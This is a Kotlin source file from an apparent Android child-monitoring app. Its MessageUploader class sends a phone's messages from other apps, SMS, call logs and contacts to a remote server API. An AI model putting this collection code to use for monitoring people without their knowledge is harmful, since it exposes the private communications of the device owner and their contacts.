package com.monitor.child.network

import android.util.Log
import com.monitor.child.accessibility.RawMessage
import com.monitor.child.data.PreferencesManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class MessageUploader(
    private val apiClient: ApiClient,
    private val prefs: PreferencesManager,
) {
    companion object {
        private const val TAG = "MessageUploader"
    }

    suspend fun uploadMessages(
        app: String,
        contactName: String?,
        contactIdentifier: String,
        messages: List<RawMessage>,
    ) = withContext(Dispatchers.IO) {
        if (messages.isEmpty()) return@withContext

        val payload = mapOf(
            "messages" to messages.map { m ->
                mapOf(
                    "app" to app,
                    "contactName" to contactName,
                    "contactIdentifier" to contactIdentifier,
                    "direction" to m.direction,
                    "body" to m.body,
                    "timestamp" to System.currentTimeMillis(),
                    "threadId" to null,
                )
            }
        )

        val ok = apiClient.post("/api/messages", payload)
        if (!ok) Log.w(TAG, "Error subiendo mensajes de $app")
    }

    suspend fun uploadSmsMessages(messages: List<SmsMessage>) = withContext(Dispatchers.IO) {
        if (messages.isEmpty()) return@withContext

        val payload = mapOf(
            "messages" to messages.map { m ->
                mapOf(
                    "app" to "sms",
                    "contactName" to m.contactName,
                    "contactIdentifier" to m.address,
                    "direction" to m.direction,
                    "body" to m.body,
                    "timestamp" to m.timestamp,
                    "threadId" to m.threadId.toString(),
                )
            }
        )

        val ok = apiClient.post("/api/messages", payload)
        if (!ok) Log.w(TAG, "Error subiendo SMS")
    }

    suspend fun uploadCallLogs(calls: List<CallLogEntry>) = withContext(Dispatchers.IO) {
        if (calls.isEmpty()) return@withContext

        val payload = mapOf(
            "calls" to calls.map { c ->
                mapOf(
                    "source" to c.source,
                    "contactName" to c.contactName,
                    "phoneNumber" to c.phoneNumber,
                    "type" to c.type,
                    "durationSeconds" to c.durationSeconds,
                    "timestamp" to c.timestamp,
                )
            }
        )

        val ok = apiClient.post("/api/calls", payload)
        if (!ok) Log.w(TAG, "Error subiendo llamadas")
    }

    suspend fun uploadContacts(contacts: List<ContactEntry>) = withContext(Dispatchers.IO) {
        if (contacts.isEmpty()) return@withContext

        val payload = mapOf("contacts" to contacts.map { c ->
            mapOf(
                "name" to c.name,
                "phoneNumbers" to c.phoneNumbers,
                "emails" to c.emails,
            )
        })

        val ok = apiClient.post("/api/calls/contacts", payload)
        if (!ok) Log.w(TAG, "Error sincronizando contactos")
    }
}

data class SmsMessage(
    val address: String,
    val contactName: String?,
    val body: String,
    val direction: String,
    val timestamp: Long,
    val threadId: Long,
)

data class CallLogEntry(
    val source: String,
    val contactName: String?,
    val phoneNumber: String,
    val type: String,
    val durationSeconds: Int,
    val timestamp: Long,
)

data class ContactEntry(
    val name: String,
    val phoneNumbers: List<String>,
    val emails: List<String>,
)
